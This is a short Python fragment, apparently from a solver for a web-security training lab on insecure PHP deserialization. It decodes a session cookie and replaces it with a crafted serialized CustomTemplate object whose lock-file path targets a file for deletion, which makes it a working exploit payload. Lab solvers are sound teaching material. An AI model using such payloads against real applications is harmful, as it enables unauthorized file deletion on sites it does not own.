...
def insecure_serialized(s):
    session = s.cookies.get_dict()['session']
    url_decoded = url_decode(session)
    serialized_obj = base64.b64decode(url_decoded).decode('utf-8')
    new_serialized_obj = "O:14:\"CustomTemplate\":2:{S:18:\"template_file_path\";S:23:\"/home/carlos/morale.txt\";S:14:\"lock_file_path\";S:23:\"/home/carlos/morale.txt\";}"
    ...
    print(f'[+] Changed {serialized_obj} --> {new_serialized_obj}')
